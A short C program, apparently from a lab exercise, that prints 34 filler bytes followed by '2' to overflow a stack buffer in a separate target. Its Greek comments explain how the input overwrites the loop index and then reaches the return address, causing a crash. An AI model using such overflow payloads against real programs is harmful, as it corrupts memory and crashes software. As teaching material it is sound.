#include <stdio.h>
int main(){
    int i;
    for(i=0;i<34;i++){
        putchar('1');  /*allocate 34 bytes until u reach to the first byte of i */
    }

    putchar('2');       /*vazontas to 2 sto prwto byte tou i epeidi einai little endian to i tha paei stin ls meria ara tha kanei to i 
    na exei timi 0x32 opou einai 50  , to buf[50] omws einai to prwto byte toy return address ara molis paei na to diavasei tha faei seg */

return 0;
}